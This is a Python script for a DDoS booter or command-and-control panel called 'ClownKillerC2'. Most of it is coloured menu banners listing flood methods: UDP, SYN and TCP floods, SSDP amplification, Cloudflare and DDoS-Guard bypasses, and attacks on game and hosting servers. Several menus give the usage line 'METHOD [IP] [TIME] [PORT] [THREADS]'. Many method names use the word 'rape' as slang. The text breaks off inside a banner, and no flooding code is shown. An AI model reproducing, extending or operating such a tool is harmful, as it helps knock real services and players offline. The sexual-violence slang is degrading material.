#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#TOOLS AUHTOR TRANSFORMER X BUMBLEBEE
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
from time import sleep
nicknm = "ClownKillerC2"

mt = """
\x1b[38;2;0;204;111m                \x1b[38;2;0;221;34m╔════\x1b[38;2;0;212;14m═════════╦═════════\x1b[38;2;0;186;45m══════════════\x1b[38;2;0;83;168m══════════╗
\x1b[38;2;0;204;111m                 ║             ╔╦╗╔═╗╦╔╗╔╔╦╗╔═╗╔╗╔╔═╗╔═╗
\x1b[38;2;0;204;111m                 ║             ║║║╠═╣║║║║ ║ ╠═╣║║║║  ║╣ 
\x1b[38;2;0;204;111m                 ║             ╩ ╩╩ ╩╩╝╚╝ ╩ ╩ ╩╝╚╝╚═╝╚═╝
\x1b[38;2;0;204;111m                 ║             👑\x1b[38;2;0;204;111mMAINTANCE L\033[0;37m WAITING TOOLS👑
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚════\x1b[38;2;0;212;14m═════════╩═════════\x1b[38;2;0;186;45m══════════════\x1b[38;2;0;83;168m══════════╝
"""

methods = """
\x1b[38;2;0;221;34m                      ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\x1b[38;2;0;221;34m                      ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\x1b[38;2;0;221;34m                      ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\x1b[38;2;0;221;34m                      👑METHODS TOOLS DDOS👑
\x1b[38;2;0;204;111m  \x1b[38;2;0;221;34m╔═════\x1b[38;2;0;212;14m════════════════════╦═\x1b[38;2;0;186;45m═════════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m  ║ \033[0;34m1. Game Bypass Methods. Commands = slaprape            \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \033[0;34m2. Layer4. Commands = layer4                         \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \033[0;34m3. VIP. Commands = vip         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \033[0;34m3. Layer7. Commands = layer7        			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \033[0;34m3. help. Commands = help         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \033[0;34m3. plan. Commands = plan         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \033[0;34m3. primitive. Commands = primitive         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \033[0;34m3. raw. Commands = raw         			 \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  ║ \033[0;34mNon-Copyright Items Issue       		         \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m  \x1b[38;2;0;221;34m╩════\x1b[38;2;0;212;14m═══════════════════╝  ╚══\x1b[38;2;0;186;45m═══════════\x1b[38;2;0;83;168m══════════════╩╗
"""

raw = """
\x1b[38;2;0;221;34m                         ╦═╗╔═╗╦ ╦  \x1b[38;2;0;241;29m╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\x1b[38;2;0;221;34m                         ╠╦╝╠═╣║║║\x1b[38;2;0;241;29m ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\x1b[38;2;0;221;34m                         ╩╚═╩ ╩╚╩╝  \x1b[38;2;0;241;29m╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\x1b[38;2;0;204;111m                              👑\x1b[38;2;0;204;111mRAW R\033[0;37mMethods👑
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔═══════\x1b[38;2;0;212;14m══════════════════\x1b[38;2;0;186;45m═╦═══════════════\x1b[38;2;0;83;168m═════════════╗
\x1b[38;2;0;204;111m            ║ \033[0;34mudpraw \033[36m- \033[0;34mRaw UDP Flood \x1b[38;2;0;204;111m  ║ \033[0;34mhexraw \033[36m- \033[0;34mRaw HEX Flood \x1b[38;2;0;204;111m    ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚╦══════\x1b[38;2;0;212;14m══════════════════\x1b[38;2;0;186;45m╦╩╦══════════════\x1b[38;2;0;83;168m════════════╦╝
\x1b[38;2;0;204;111m             ║ \033[0;34mtcpraw \033[36m- \033[0;34mRaw TCP Flood \x1b[38;2;0;204;111m║ ║ \033[0;34mvseraw \033[36m- \033[0;34mRaw VSE Flood \x1b[38;2;0;204;111m  ║
\x1b[38;2;0;204;111m             ║ \033[0;34mstdraw \033[36m- \033[0;34mRaw STD Flood \x1b[38;2;0;204;111m║ ║ \033[0;34msynraw \033[36m- \033[0;34mRaw SYN Flood \x1b[38;2;0;204;111m  ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔╩══════\x1b[38;2;0;212;14m══════════════════\x1b[38;2;0;186;45m╝ ╚═══════════════\x1b[38;2;0;83;168m═══════════╩╗
\x1b[38;2;0;204;111m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT] [THREADS]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚═══════\x1b[38;2;0;212;14m══════════════════\x1b[38;2;0;186;45m═════════════════\x1b[38;2;0;83;168m═════════════╝
"""

slaprape = """
\x1b[38;2;0;221;34m                                    ╔═╗╦  ╔═╗╔═╗\x1b[38;2;0;241;29m╦═╗╔═╗╔═╗╔═╗
\x1b[38;2;0;221;34m                                    ╚═╗║  ╠═╣╠═╝\x1b[38;2;0;241;29m╠╦╝╠═╣╠═╝║╣ 
\x1b[38;2;0;221;34m                                    ╚═╝╩═╝╩ ╩╩   \x1b[38;2;0;241;29m ╩╚═╩ ╩╩  ╚═╝
\x1b[38;2;0;204;111m                                         👑\x1b[38;2;0;204;111mSLAP M\033[0;37mR RAPE👑
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔══════\x1b[38;2;0;212;14m═════════════════\x1b[38;2;0;186;45m═══╦══════════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m            ║ \033[0;34movhslav \033[36m- \033[0;34mSlavic Flood \x1b[38;2;0;204;111m  ║ \033[0;34miotv1 \033[36m- \033[0;34mCustom Method!  \x1b[38;2;0;204;111m   ║
\x1b[38;2;0;204;111m            ║ \033[0;34mcpukill \033[36m- \033[0;34mCpu Rape Flood\x1b[38;2;0;204;111m ║ \033[0;34miotv2 \033[36m- \033[0;34mCustom Method!  \x1b[38;2;0;204;111m   ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚╦═════\x1b[38;2;0;212;14m═════════════════\x1b[38;2;0;186;45m══╦╩╦═════════════\x1b[38;2;0;83;168m═════════════╦╝
\x1b[38;2;0;204;111m             ║ \033[0;34mfivemkill \033[36m- \033[0;34mfivembypass \x1b[38;2;0;204;111m║ ║ \033[0;34miotv3 \033[36m-\033[0;34m Custom Method!  \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m             ║ \033[0;34micmprape  \033[36m- \033[0;34mICMP Rape  \x1b[38;2;0;204;111m║ ║ \033[0;34mssdp  \033[36m-\033[0;34m Amped SSDP      \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m             ║ \033[0;34mtcprape \033[36m- \033[0;34mRaping TCP   \x1b[38;2;0;204;111m║ ║ \033[0;34marknull \033[36m- \033[0;34mArk Method    \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m             ║ \033[0;34mnforape \033[36m- \033[0;34mNfo Method   \x1b[38;2;0;204;111m║ ║ \033[0;34m2kdown  \033[36m- \033[0;34mNBA 2K Flood  \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔╩═════\x1b[38;2;0;212;14m═════════════════\x1b[38;2;0;186;45m══╝ ╚══════════════\x1b[38;2;0;83;168m════════════╩╗
\x1b[38;2;0;204;111m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT] [THREADS]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚══════\x1b[38;2;0;212;14m═════════════════\x1b[38;2;0;186;45m══════════════════\x1b[38;2;0;83;168m══════════════╝
"""

primitive = """
\x1b[38;2;0;221;34m                          ╔═╗╦═╗╦╦  ╦╔═╗╔╦╗╔═╗\x1b[38;2;0;241;29m╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\x1b[38;2;0;221;34m                          ╠═╝╠╦╝║╚╗╔╝╠═╣ ║ ║╣   \x1b[38;2;0;241;29m║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\x1b[38;2;0;221;34m                          ╩  ╩╚═╩ ╚╝ ╩ ╩ ╩ ╚═╝  ╩ ╩\x1b[38;2;0;241;29m╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\033[36m                                 👑\x1b[38;2;0;204;111mPRIVATE M\033[37mY METHODS👑
\x1b[38;2;0;204;111m           \x1b[38;2;0;221;34m ╔══════\x1b[38;2;0;212;14m═══════════════════\x1b[38;2;0;186;45m═╦══════════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m║ \033[0;34mhomeslap    \033[36m. \033[0;34mr6kill     \x1b[38;2;0;204;111m║ \033[0;34mfivemtcp  \033[36m. \033[0;34mnfokill       \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m║ \033[0;34mark255      \033[36m. \033[0;34marklift    \x1b[38;2;0;204;111m║ \033[0;34mhotspot   \033[36m. \033[0;34mvpn           \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m║ \033[0;34mhydrakiller \033[36m. \033[0;34markdown    \x1b[38;2;0;204;111m║ \033[0;34mnfonull   \033[36m. \033[0;34mdhcp          \x1b[38;2;0;204;111m ║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚╦═════\x1b[38;2;0;212;14m═══════════════════\x1b[38;2;0;186;45m╦╩╦═════════════\x1b[38;2;0;83;168m═════════════╦╝
\x1b[38;2;0;204;111m             \x1b[38;2;0;221;34m║ \033[0;34movhnat    \033[36m. \033[0;34movhamp     \x1b[38;2;0;204;111m║ ║ \033[0;34movhwdz    \033[36m. \033[0;34movhx         \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             ║ \033[0;34mnfodrop   \033[36m. \033[0;34mnfocrush   \x1b[38;2;0;204;111m║ ║ \033[0;34mnfodown   \033[36m. \033[0;34mnfox         \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             ║ \033[0;34mudprape   \033[36m. \033[0;34mudprapev3  \x1b[38;2;0;204;111m║ ║ \033[0;34mfortnite  \033[36m. \033[0;34mfortnitev2   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             ║ \033[0;34mudprapev2 \033[36m. \033[0;34mudpbypass  \x1b[38;2;0;204;111m║ ║ \033[0;34mgreeth    \033[36m. \033[0;34mtelnet       \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             ║ \033[0;34mfivemv2   \033[36m. \033[0;34mr6drop     \x1b[38;2;0;204;111m║ ║\033[0;34m r6freeze  \033[36m. \033[0;34mkillall      \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             ║ \033[0;34m2krape    \033[36m. \033[0;34mfallguys   \x1b[38;2;0;204;111m║ ║ \033[0;34movhdown   \033[36m. \033[0;34movhkill      \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             ║ \033[0;34mfivemrape \033[36m. \033[0;34mfivemdown  \x1b[38;2;0;204;111m║ ║ \033[0;34mfivemv1   \033[36m. \033[0;34mfivemslump   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             \x1b[38;2;0;221;34m║ \033[0;34mkillallv2 \033[36m. \033[0;34mkillallv3  \x1b[38;2;0;204;111m║ ║ \033[0;34mpowerslap \033[36m. \033[0;34mrapecom      \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔╩═════\x1b[38;2;0;212;14m═══════════════════╝ \x1b[38;2;0;186;45m╚══════════════\x1b[38;2;0;83;168m════════════╩╗
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT] [THREADS]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m           \x1b[38;2;0;221;34m ╚══════\x1b[38;2;0;212;14m════════════════════\x1b[38;2;0;186;45m════════════════\x1b[38;2;0;83;168m═════════════╝
"""

layer4 = """\x1b[38;2;0;204;111m
\x1b[38;2;0;221;34m                            ╦  ╔═╗╦ ╦╔═╗╦═╗\x1b[38;2;0;241;29m ╔═╗╔╦╗╔═╗╔═╗╔╦╗
\x1b[38;2;0;221;34m                            ║  ╠═╣╚╦╝║╣ ╠╦╝\x1b[38;2;0;241;29m ║╣ ║║║╠═╝╠═╣ ║ 
\x1b[38;2;0;221;34m                            ╩═╝╩ ╩ ╩ ╚═╝╩╚═\x1b[38;2;0;241;29m ╚═╝╩ ╩╩  ╩ ╩ ╩                 
\033[36m                                   👑\x1b[38;2;0;204;111mLAYER4 M\033[37mY METHODS👑                     
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔════\x1b[38;2;0;212;14m════════════════\x1b[38;2;0;186;45m══════╦═════════\x1b[38;2;0;83;168m═══════════════════╗
\x1b[38;2;0;204;111m            ║  \033[0;34mudp \033[36m[IP] [TIME] [PORT]  \x1b[38;2;0;204;111m║   \033[0;34mvse \033[36m[IP] [TIME] [PORT]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            ║  \033[0;34mtcp \033[36m[IP] [TIME] [PORT]  \x1b[38;2;0;204;111m║   \033[0;34mack \033[36m[IP] [TIME] [PORT]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚╦═══\x1b[38;2;0;212;14m════════════════\x1b[38;2;0;186;45m═════╦╩╦════════\x1b[38;2;0;83;168m══════════════════╦╝
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m ║ \033[0;34mstd \033[36m[IP] [TIME] [PORT] \x1b[38;2;0;204;111m║ ║ \033[0;34mdns \033[36m[IP] [TIME] [PORT]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             ║ \033[0;34msyn \033[36m[IP] [TIME] [PORT] \x1b[38;2;0;204;111m║ ║ \033[0;34movh \033[36m[IP] [TIME] [PORT]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m             \x1b[38;2;0;221;34m║\033[36m- - - - - - - \033[93mhomerape \033[0;34m[IP] [TIME] [PORT] \033[36m- - - - - -\x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔╩═══\x1b[38;2;0;212;14m════════════════\x1b[38;2;0;186;45m═════╝ ╚═════════\x1b[38;2;0;83;168m═════════════════╩╗
\x1b[38;2;0;204;111m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT] [THREADS]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚════\x1b[38;2;0;212;14m════════════════\x1b[38;2;0;186;45m════════════════\x1b[38;2;0;83;168m═══════════════════╝
"""

layer7 = """
\x1b[38;2;0;221;34m                             ╦  ╔═╗╦ ╦╔═╗╦═╗\x1b[38;2;0;241;29m ╔╦╗╦ ╦ ╦╦ ╦╦ ╦
\x1b[38;2;0;221;34m                             ║  ╠═╣╚╦╝║╣ ╠╦╝\x1b[38;2;0;241;29m║ ║ ║ ║║ ║╠═╣
\x1b[38;2;0;221;34m                             ╩═╝╩ ╩ ╩ ╚═╝╩╚═\x1b[38;2;0;241;29m╩ ╚═╝╚╝╚═╝╩ ╩                         
\033[36m                                      👑\x1b[38;2;0;204;111mLAYER7 M\033[37mY METHODS👑                           
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔═════\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m═════════╦══════\x1b[38;2;0;83;168m══════════════════════╗
\x1b[38;2;0;204;111m            ║  \033[0;34mhttp-stm \033[36m[IP] [TIME] [PORT]  \x1b[38;2;0;204;111m║	       		 
\x1b[38;2;0;204;111m            ║  \033[0;34mhttp-cld \033[36m[IP] [TIME] [PORT]  \x1b[38;2;0;204;111m║		
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚╦════\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m════════╦╩╦═════\x1b[38;2;0;83;168m════════════════════╦╝
\x1b[38;2;0;204;111m             ║ \033[0;34mddos-guard \033[36m[IP] [TIME] [PORT] \x1b[38;2;0;204;111m║                          
\x1b[38;2;0;204;111m             ║ \033[0;34mcloudflare \033[36m[IP] [TIME] [PORT] \x1b[38;2;0;204;111m║                           
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╔╩════\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m════════╝ ╚══════\x1b[38;2;0;83;168m════════════════════╩╗
\x1b[38;2;0;204;111m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT] [THREADS]   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m            \x1b[38;2;0;221;34m╚═════\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m════════════════\x1b[38;2;0;83;168m══════════════════════╝
"""

banner =  """
\x1b[38;2;0;221;34m                              ╔═╗┬  ┌─┐┌┐┌┌┬┐┌─┐┌┬┐
\x1b[38;2;0;221;34m                              ╠═╝│  ├─┤│││ │ │ ││││
\x1b[38;2;0;221;34m                              ╩  ┴─┘┴ ┴┘└┘ ┴ └─┘┴ ┴
\033[36m                               👑MATOM M\033[37mY PLANTOM👑
\033[36m                \x1b[38;2;0;221;34m╔══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m══════════════════════╗
\033[36m                \x1b[38;2;0;221;34m║\033[37m- - - - - - - ❦𝓜𝓲𝓼𝓼⋆⌬ιvᴀɴxᴘʟuтoɴ C2 By \033[37m@❦𝓜𝓲𝓼𝓼⋆⌬ιvᴀɴxтʀᴀɴsғoʀмᴇʀ C2 \033[37m- - - - - - -\033[36m ║
\033[36m                \x1b[38;2;0;221;34m║\033[37m  - - - ❦𝓜𝓲𝓼𝓼⋆⌬тʏᴘᴇ \033[37m❦𝓜𝓲𝓼𝓼⋆⌬нᴇʟᴘ\033[37m ❦𝓜𝓲𝓼𝓼⋆⌬тo sᴇᴇ тнᴇ Hᴇʟᴘ Mᴇɴu - - -\033[36m   ║
\033[36m                \x1b[38;2;0;221;34m╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════════╝
\033[36m                \x1b[38;2;0;221;34m╔══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m══════════════════════╗
\033[36m                \x1b[38;2;0;221;34m╚══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m════════════\x1b[38;2;0;83;168m═══════════════════╝
\033[36m                 \x1b[38;2;0;221;34m╔═\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m═════════════════════╗
\033[36m                 \x1b[38;2;0;221;34m║\033[36m-  - - - ❦𝓜𝓲𝓼𝓼⋆⌬𝑪𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏 𝑯𝒂𝒔 𝑩𝒆𝒆𝒏 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 𝑨𝑷𝑰 𝑯𝒂𝒔 𝑩𝒆𝒆𝒏 [𝑶𝒏𝒍𝒊𝒏𝒆] \033[37m[24/02/2024]║- - -
\033[36m                 \x1b[38;2;0;221;34m║\033[36m-  - - -  ❦𝓜𝓲𝓼𝓼⋆⌬Tⓔⓛⓔⓖⓡⓐⓜ :  \033[37m @❦𝓜𝓲𝓼𝓼⋆⌬𝑰𝒗𝒂𝒏𝓟𝓮𝓽𝓮𝓻 \033[36m- - -║
\033[36m                 \x1b[38;2;0;221;34m║\033[36m-  - - -  ❦𝓜𝓲𝓼𝓼⋆⌬ⓘⓝⓢⓣⓐⓖⓡⓐⓜ :  \033[37m @❦𝓜𝓲𝓼𝓼⋆⌬𝑰𝒗𝒂𝒏𝓟𝓮𝓽𝓮𝓻 \033[36m- - -║
\033[36m                 \x1b[38;2;0;221;34m║\033[36m-  - - -  ❦𝓜𝓲𝓼𝓼⋆⌬ⓓⓘⓢ©ⓞⓡⓓ :  \033[37m #❦𝓜𝓲𝓼𝓼⋆⌬𝑰𝒗𝒂𝒏𝓟𝓮𝓽𝓮𝓻 \033[36m- - -║
\033[36m                 \x1b[38;2;0;221;34m║\033[36m-  - - -  ❦𝓜𝓲𝓼𝓼⋆⌬ⓨⓞⓤⓣⓤⓑⓔ :  \033[37m @❦𝓜𝓲𝓼𝓼⋆⌬𝑰𝒗𝒂𝒏𝓟𝓮𝓽𝓮𝓻 \033[36m- - -║
\033[36m                 \x1b[38;2;0;221;34m║\033[36m-  - - - ❦𝓜𝓲𝓼𝓼⋆⌬𝑪𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏 𝑯𝒂𝒔 𝑩𝒆𝒆𝒏 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 𝑨𝑷𝑰 𝑯𝒂𝒔 𝑩𝒆𝒆𝒏 [𝑶𝒏𝒍𝒊𝒏𝒆] \033[37m[24/02/2024]║- - -
\033[36m                 ╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════╝
\033[36m                \x1b[38;2;0;221;34m╔═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════════╗
\033[36m                \x1b[38;2;0;221;34m╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════════╝
\033[36m                \x1b[38;2;0;221;34m╔══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m══════════════════════╗
\033[36m                \x1b[38;2;0;221;34m║\033[37m- - - - - - - ❦𝓜𝓲𝓼𝓼⋆⌬ιvᴀɴxᴘʟuтoɴ C2 By \033[37m@❦𝓜𝓲𝓼𝓼⋆⌬ιvᴀɴxтʀᴀɴsғoʀмᴇʀ C2 \033[37m- - - - - - -\033[36m ║
\033[36m                \x1b[38;2;0;221;34m║\033[37m  - - - ❦𝓜𝓲𝓼𝓼⋆⌬тʏᴘᴇ \033[37m❦𝓜𝓲𝓼𝓼⋆⌬нᴇʟᴘ\033[37m ❦𝓜𝓲𝓼𝓼⋆⌬тo sᴇᴇ тнᴇ Hᴇʟᴘ Mᴇɴu - - -\033[36m   ║
\033[36m                \x1b[38;2;0;221;34m╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════════╝
"""

attacked =  """
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔═══\x1b[38;2;0;212;14m═════════\x1b[38;2;0;186;45m═╦═════════════\x1b[38;2;0;83;168m════════════════════╗
\x1b[38;2;0;204;111m                 ║         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔╦╗╔═╗╦═╗╔╦╗╔═╗╔╦╗
\x1b[38;2;0;204;111m                 ║         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗ ║ ╠═╣╠╦╝ ║ ║╣  ║║
\x1b[38;2;0;204;111m                 ║         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝ ╩ ╩ ╩╩╚═ ╩ ╚═╝═╩╝
\x1b[38;2;0;204;111m                 ║             👑\x1b[38;2;0;204;111mATTACKED L\033[0;37m STARTED👑
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚═══\x1b[38;2;0;212;14m═════════\x1b[38;2;0;186;45m═╩═════════════\x1b[38;2;0;83;168m════════════════════╝
"""

helpservice =  """
\x1b[38;2;0;204;111m                    ╦ ╦╔═╗╦  ╔═╗\033[0;37m╔═╗╔═╗╦═╗╦  ╦╦╔═╗╔═╗
\x1b[38;2;0;204;111m                    ╠═╣║╣ ║  ╠═╝\033[0;37m╚═╗║╣ ╠╦╝╚╗╔╝║║  ║╣ 
\x1b[38;2;0;204;111m                    ╩ ╩╚═╝╩═╝╩\033[0;37m╚═╝╚═╝╩╚═ ╚╝ ╩╚═╝╚═╝
\033[36m                            👑\x1b[38;2;0;204;111mHELP H\033[37mS SERVICE👑                           
\x1b[38;2;0;204;111m           \x1b[38;2;0;221;34m╦════\x1b[38;2;0;212;14m══════════\x1b[38;2;0;186;45m══════════════\x1b[38;2;0;83;168m═══════════════════╦
\x1b[38;2;0;204;111m	       ║ \033[0;34mMETHODS     ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \033[0;34mPLAN        ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \033[0;34mVIP         ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \033[0;34mLAYER4      ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \033[0;34mPRIMITVE    ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m	       ║ \033[0;34mSLAPRAPE      ||  ||			   \x1b[38;2;0;204;111m║
\x1b[38;2;0;204;111m           \x1b[38;2;0;221;34m╩════\x1b[38;2;0;212;14m══════════\x1b[38;2;0;186;45m══════════════\x1b[38;2;0;83;168m═══════════════════╩

"""
vip = """
\x1b[38;2;0;204;111m                                 ╦  ╦╦╔═╗  ╔═╗\033[0;37m╔═╗╔═╗╔═╗╔═╗
\x1b[38;2;0;204;111m                                 ╚╗╔╝║╠═╝  \033[0;37m╠═╣║  ║  ║╣ ╚═╗
\x1b[38;2;0;204;111m                                    ╚╝ ╩╩    ╩ ╩\033[0;37m╚═╝╚═╝╚═╝╚═╝
\x1b[38;2;0;204;111m                                  👑MY VIP ACCESS = \033[0;32mTRUE👑
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔════\x1b[38;2;0;212;14m═════════╦═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m                 ║ RAW         ║ Shows All VIP Raw Methods       ║
\x1b[38;2;0;204;111m                 ║ LAYER7      ║ Shows All VIP L7 Methods        ║
\x1b[38;2;0;204;111m                 ║ PRIMITIVE   ║ Shows All VIP Primitive Methods ║
\x1b[38;2;0;204;111m                 ║ PIT         ║ Shows All VIP Pit API Methods    ║
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚════\x1b[38;2;0;212;14m═════════╩═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m══════════════╝
"""

plan =  """
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔═════\x1b[38;2;0;212;14m════════╦═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m══════════════╗
\x1b[38;2;0;204;111m                 ║          ╔═╗╦  ╔═╗╔╗╔\033[0;37m╔═╗╔═╗╦═╗╦  ╦╦╔═╗╔═╗
\x1b[38;2;0;204;111m                 ║          ╠═╝║  ╠═╣║║║\033[0;37m ╚═╗║╣ ╠╦╝╚╗╔╝║║  ║╣ 
\x1b[38;2;0;204;111m                 ║          ╩  ╩═╝╩ ╩╝╚╝\033[0;37m╚═╝╚═╝╩╚═ ╚╝ ╩╚═╝╚═╝
\x1b[38;2;0;204;111m                 ║              👑\x1b[38;2;0;204;111mPLAN L\033[0;37m SERVICE👑
\x1b[38;2;0;204;111m                 ║           \033[0;37mVIP ACCES = TRUE
\x1b[38;2;0;204;111m                 ║           \033[0;37mUSERNAME = TransformerXBumblebee                
\x1b[38;2;0;204;111m                 ║           \033[0;37mADMIN ACCES = TRUE
\x1b[38;2;0;204;111m                 ║           \033[0;37mEXPIRED TIME = 99000000
\x1b[38;2;0;204;111m                 ║           \033[0;37mAPI ACCESS = TRUE
\x1b[38;2;0;204;111m                 ║           \033[0;37mBOTS ACCESS = TRUE
\x1b[38;2;0;204;111m                 ║           \033[0;37mPLAYER ACCESS = TRUE
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚═════\x1b[38;2;0;212;14m════════╩════════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;83;168m═════════════╝
"""

bots =  """
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔═════\x1b[38;2;0;212;14m════════╦═════════════\x1b[38;2;0;186;45m═══════\x1b[38;2;0;83;168m═════════════╗
\x1b[38;2;0;204;111m                 ║                ╔╗ ╔═╗╔╦╗╔═╗\033[0;37m╔═╗╔═╗╔═╗╔═╗╔═╗
\x1b[38;2;0;204;111m                 ║                ╠╩╗║ ║ ║ ╚═╗  \033[0;37m╠═╣║  ║  ║╣ ╚═╗
\x1b[38;2;0;204;111m                 ║                ╚═╝╚═╝ ╩ ╚═╝ \033[0;37m ╩ ╩╚═╝╚═╝╚═╝╚═╝
\x1b[38;2;0;204;111m                 ║              👑\x1b[38;2;0;204;111mBOTS L\033[0;37m ACCES👑
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mVIP ACCES = \033[0;37m[999999]
